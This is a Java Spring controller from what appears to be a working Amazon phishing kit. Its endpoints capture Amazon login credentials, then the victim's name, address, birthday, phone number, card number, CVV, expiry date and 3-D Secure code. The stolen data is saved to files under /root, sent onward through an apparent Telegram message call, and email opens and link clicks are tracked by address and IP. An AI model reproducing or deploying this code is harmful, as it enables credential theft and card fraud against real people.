package com.kidd.amazon.web;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.kidd.amazon.common.IpUtils;
import com.kidd.amazon.model.FraudUserInfoForm;
import com.kidd.amazon.model.UserInfoForm;
import com.kidd.amazon.task.AsyncTask;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.*;


@Controller
public class AmazonController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;


    @Autowired
    private HttpServletResponse response;

    @GetMapping("/signin")
    public Object signin(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al,@RequestParam(value = "email",defaultValue = "null") String email, Model model) {
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/countClickLink.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr+":"+email+"|"+ip);
        fileAppender.flush();
        return "login";
    }

    @PostMapping("/kiddSigin")
    @ResponseBody
    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent, @RequestHeader("Accept-Language") String al, Model model) {
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd HH:mm:ss");
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("AmazonId", form1.getKiddfiled1());
        userInfoMap.put("AmazomPwd", form1.getKiddfiled2());
        session.setAttribute("userInfo", userInfoMap);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }

    @GetMapping("/warn")
    public Object warning(@RequestHeader("Accept-Language") String al, Model model) {
        return "warning";
    }

    @GetMapping("/user-bill")
    public Object billing(@RequestHeader("Accept-Language") String al, Model model) {
        return "billing";
    }

    @PostMapping("/kiddbilling")
    @ResponseBody
    public Object billing3(UserInfoForm form, @RequestHeader("Accept-Language") String al, Model model) {
        System.out.println("UserInfoForm:"+ JSON.toJSONString(form));
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("countryCode", form.getCountryCode());
        userInfoMap.put("FullName", form.getEnterAddressFullName());
        if (!(StringUtils.isEmpty(form.getEnterAddressPostalCodeOne()) && StringUtils.isEmpty(form.getEnterAddressPostalCodeTwo()))) {
            userInfoMap.put("PostalCode", form.getEnterAddressPostalCodeOne() + form.getEnterAddressPostalCodeTwo());
        }
        if (!(StringUtils.isEmpty(form.getBirth_day()) && StringUtils.isEmpty(form.getBirth_day()) && StringUtils.isEmpty(form.getBirth_day()))) {
            userInfoMap.put("BirthDay", String.format("%s/%s/%s", form.getBirth_year(), form.getBirth_month(), form.getBirth_day()));
        }
        userInfoMap.put("StateOrRegion", form.getEnterAddressStateOrRegion());
        userInfoMap.put("AddressLine1", form.getEnterAddressLine1());
        userInfoMap.put("AddressLine2", form.getEnterAddressLine2());
        userInfoMap.put("AddressLine3", form.getEnterAddressLine3());
        userInfoMap.put("PhoneNumber", form.getEnterAddressPhoneNumber());
        userInfoMap.put("CardName", form.getNameCard());
        userInfoMap.put("CardNo", form.getCxdi());
        userInfoMap.put("CVV", form.getCsc());
        if (!(StringUtils.isEmpty(form.getYear()) && StringUtils.isEmpty(form.getMonth()))) {
            userInfoMap.put("Expire", String.format("%s/%s", form.getYear(), form.getMonth()));
        }
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        System.out.println("userInfoMap:"+ JSON.toJSONString(userInfoMap));
        asyncTask.asyncWriteMap(String.format("/root/amazon-lack-fish/%s.txt", timeStr), userInfoMap);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }

    @GetMapping("/user-verified")
    public Object verifiedby(UserInfoForm form, Model model, @RequestHeader("Accept-Language") String al) {
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        String cardNo = userInfoMap.get("CardNo");
        String cardName = userInfoMap.get("CardName");
        if(StringUtils.isEmpty(cardNo)){
            cardNo="*****";
        }
        if(StringUtils.isEmpty(cardName)){
            cardName="*****";
        }
//        if(null==form.getCxdi()){
//            form.setCxdi("*******");
//        }
//        model.addAttribute("cardNo", form.getCxdi().substring(form.getCxdi().length() - 4, form.getCxdi().length()));
//        model.addAttribute("cardName", form.getNameCard());
        model.addAttribute("dateTime", timeStr);
        model.addAttribute("cardName", cardName);
        model.addAttribute("cardNo",cardNo.substring(cardNo.length() - 4, cardNo.length()));
        return "verified";
    }

    @PostMapping("/verified")
    @ResponseBody
    public Object verifiedby2(UserInfoForm form, @RequestHeader("Accept-Language") String al, Model model) {
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap =(Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("3dSecret",form.getKiddfiled1());
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/amazon-fish/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSendTgMsg(null,null,userInfoMap);
        Map map = new HashMap();
        map.put("data", "ok");
        return map;
    }

    @GetMapping("/thanks")
    public Object thanks(@RequestHeader("Accept-Language") String al, Model model) {
        //标识已完成，不准再次进入
        addCookie("kiddIp", IpUtils.getIpAddress(request));
        return "thanks";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }

    @GetMapping("/zipcode")
    @ResponseBody
    public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
        String jstr = "";
        try {
            Map parm = new HashMap<String, String>();
            parm.put("zipcode", zipCode);
            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .form(parm)//表单内容
                    .timeout(20000)//超时，毫秒
                    .execute().body();
            JSONObject jobj = JSONUtil.parseObj(result);
            jstr = JSONUtil.toJsonStr(jobj);
        } catch (Exception e) {
            HashMap<String, Object> map = new HashMap<>();
            map.put("status", 500);
            map.put("message", null);
            map.put("results", null);
            jstr = JSONUtil.toJsonStr(map);
        }
        return jstr;
    }


    @RequestMapping("/count")
    @ResponseBody
    public void thanks(@RequestHeader("Accept-Language") String al, @RequestParam(value = "email",defaultValue = "null") String email) {
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/countOpenEmail.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr+":"+email+"|"+ip);
        fileAppender.flush();
    }
}
